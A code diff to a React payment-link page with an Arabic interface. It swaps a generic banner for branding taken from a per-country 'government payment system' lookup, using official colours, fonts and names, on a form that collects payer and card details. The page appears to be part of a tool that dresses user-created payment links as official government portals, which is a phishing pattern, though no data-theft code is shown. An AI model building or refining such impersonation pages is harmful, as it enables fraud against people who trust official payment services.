@@ -12,6 +12,8 @@ import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countr
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
+import BrandedTopBar from "@/components/BrandedTopBar";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 
 const PaymentData = () => {
   const { id } = useParams();
@@ -32,6 +34,9 @@ const PaymentData = () => {
 
   const serviceName = "دفع فاتورة";
   const paymentInfo = linkData?.payload as any;
+  
+  // Get government payment system for branding
+  const govSystem = getGovernmentPaymentSystem(paymentInfo?.selectedCountry || "SA");
 
   // Get country from link data
   const countryCode = paymentInfo?.selectedCountry || "SA";
@@ -119,24 +124,23 @@ const PaymentData = () => {
         title="دفع فاتورة - إكمال البيانات"
         description="قم بإكمال بيانات السداد لدفع الفاتورة"
       />
-      <div className="min-h-screen bg-background" dir="rtl">
-        {/* Hero Section */}
-        <div
-          className="relative w-full h-48 sm:h-64 overflow-hidden"
-          style={{
-            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
-          }}
-        >
-          <div className="absolute inset-0 bg-black/30" />
-          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
-            <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
-              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
-            </div>
-          </div>
-        </div>
+      {/* Branded Top Bar */}
+      <BrandedTopBar 
+        serviceKey={serviceKey}
+        serviceName={govSystem.nameAr || serviceName}
+        showBackButton={true}
+        countryCode={countryCode}
+      />
 
-        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+      <div 
+        className="min-h-screen" 
+        dir="rtl"
+        style={{
+          background: govSystem.colors.background,
+          fontFamily: govSystem.fonts.primaryAr
+        }}
+      >
+        <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
           <div className="max-w-2xl mx-auto">
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
               <form onSubmit={handleProceed}>
